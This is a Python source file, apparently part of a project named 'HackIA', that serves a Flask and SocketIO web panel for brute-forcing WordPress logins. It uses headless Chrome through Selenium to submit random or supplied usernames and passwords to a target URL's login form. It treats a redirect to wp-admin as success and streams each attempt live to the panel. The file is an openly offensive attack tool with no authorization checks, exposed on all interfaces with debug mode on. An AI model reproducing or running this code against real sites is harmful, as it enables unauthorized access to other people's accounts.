from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
import string
import random
import time
from datetime import datetime

# Configuración de Flask
app = Flask(__name__, template_folder='C:/Users/mugiw/Desktop/HackIA/Web/templates', static_folder='C:/Users/mugiw/Desktop/HackIA/Web/static')
socketio = SocketIO(app)

# Variables globales de control
stop_attack = False
usernames = []  # Lista de usuarios generados
tried_passwords = []  # Lista acumulativa de contraseñas probadas
current_user_idx = 0  # Índice de usuario actual

# Generador de contraseñas aleatorias
def generate_random_password(length=10):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# Generador de nombres de usuario aleatorios
def generate_random_usernames(count=5, length=8):
    usernames = []
    for _ in range(count):
        username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
        usernames.append(username)
    return usernames

def try_login(driver, url, username, password):
    try:
        driver.get(url)
        time.sleep(1)

        username_field = driver.find_element(By.ID, 'user_login')
        password_field = driver.find_element(By.ID, 'user_pass')

        username_field.clear()
        password_field.clear()

        username_field.send_keys(username)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)

        time.sleep(2)
        return 'wp-admin' in driver.current_url

    except Exception as e:
        socketio.emit('log', f"[ERROR] Fallo en intento: {e}", to=None)
        return False

# Función principal de ataque por fuerza bruta
def start_attack(usernames, url, provided_password=None):
    global stop_attack, current_user_idx, tried_passwords
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    result = {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'url': url,
        'success': False,
        'username': None,
        'password': None,
        'error': None
    }

    # Inicialización si no hay usuarios
    if not usernames:
        usernames = generate_random_usernames(count=5)
        socketio.emit('log', f"[INFO] Generados usuarios aleatorios: {usernames}", to=None)

    try:
        driver.get(url)

        while not stop_attack:
            if current_user_idx >= len(usernames):
                new_users = generate_random_usernames(count=5)
                usernames.extend(new_users)
                socketio.emit('log', f"[INFO] Nuevos usuarios generados: {new_users}", to=None)

            current_username = usernames[current_user_idx]

            # Caso 1: solo contraseña proporcionada → probarla con todos los usuarios
            if provided_password and len(usernames) > 0:
                for u in usernames:
                    if stop_attack:
                        break
                    socketio.emit('log', f"[INFO] Probando {u}:{provided_password}", to=None)
                    print(f"[INFO] Probando {u}:{provided_password}")
                    if try_login(driver, url, u, provided_password):
                        result.update({'success': True, 'username': u, 'password': provided_password})
                        return result
                break  # Solo probamos una vez si solo se dio contraseña

            # Caso 2: usuario proporcionado → solo generar contraseñas nuevas para ese usuario
            if len(usernames) == 1 and provided_password is None:
                for i in range(10):
                    if stop_attack:
                        break
                    pwd = generate_random_password()
                    tried_passwords.append(pwd)
                    socketio.emit('log', f"[INTENTO {i+1}/10] {current_username}:{pwd}", to=None)
                    print(f"[INTENTO {i+1}/10] {current_username}:{pwd}")
                    if try_login(driver, url, current_username, pwd):
                        result.update({'success': True, 'username': current_username, 'password': pwd})
                        return result
                continue  # No avanzar de usuario, seguimos con el mismo

            # Caso 3: general → probar contraseñas anteriores y nuevas con nuevos usuarios
            # Primero contraseñas ya probadas
            for pwd in tried_passwords:
                if stop_attack:
                    break
                socketio.emit('log', f"[INFO] Probando {current_username}:{pwd}", to=None)
                print(f"[INFO] Probando {current_username}:{pwd}")
                if try_login(driver, url, current_username, pwd):
                    result.update({'success': True, 'username': current_username, 'password': pwd})
                    return result

            # Luego nuevas contraseñas
            for i in range(10):
                if stop_attack:
                    break
                pwd = generate_random_password()
                tried_passwords.append(pwd)
                socketio.emit('log', f"[INTENTO {i+1}/10] {current_username}:{pwd}", to=None)
                print(f"[INTENTO {i+1}/10] {current_username}:{pwd}")
                if try_login(driver, url, current_username, pwd):
                    result.update({'success': True, 'username': current_username, 'password': pwd})
                    return result

            current_user_idx += 1

    except Exception as e:
        result['error'] = f"No se pudo cargar la página: {str(e)}"
        socketio.emit('log', f"[ERROR] No se pudo cargar la página: {str(e)}", to=None)

    finally:
        driver.quit()

    return result

# Ruta principal
@app.route('/')
def home():
    return render_template('index.html')

# Endpoint que recibe los datos y lanza el ataque
@app.route('/start_attack', methods=['POST'])
def start_attack_route():
    global stop_attack, usernames, current_user_idx, tried_passwords
    stop_attack = False  # Reinicia el ataque
    usernames = []  # Reinicia la lista de usuarios
    current_user_idx = 0  # Reinicia el índice de usuario
    tried_passwords = []  # Reinicia las contraseñas probadas

    data = request.get_json()
    print(f"[INFO] Datos recibidos: {data}")

    username_input = data.get('usernames')
    if username_input:
        if isinstance(username_input, str):
            usernames = [username_input]
        else:
            usernames = username_input
    else:  # Si no, generamos unos usuarios aleatorios
        usernames = generate_random_usernames(count=5)

    url = data.get('url')
    provided_password = data.get('password')  # La contraseña proporcionada si existe

    if not url or not isinstance(url, str) or not url.strip():
        return jsonify({'error': 'Parámetros inválidos: se requiere "url".'}), 400

    result = start_attack(usernames, url, provided_password)
    return jsonify(result), 200

# Endpoint para detener el ataque
@app.route('/stop_attack', methods=['POST'])
def stop_attack_route():
    global stop_attack
    stop_attack = True
    return jsonify({'message': 'Ataque detenido.'}), 200
# Endpoint limpiar consola
@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    global tried_passwords, usernames, current_user_idx, stop_attack
    tried_passwords = []
    usernames = []
    current_user_idx = 0
    stop_attack = False
    socketio.emit('clear')  # Emitir evento a la consola si se usa JS para limpiar
    return render_template('index.html')

# Iniciar la aplicación
if __name__ == "__main__":
    socketio.run(app, debug=True, host="0.0.0.0", port=9999)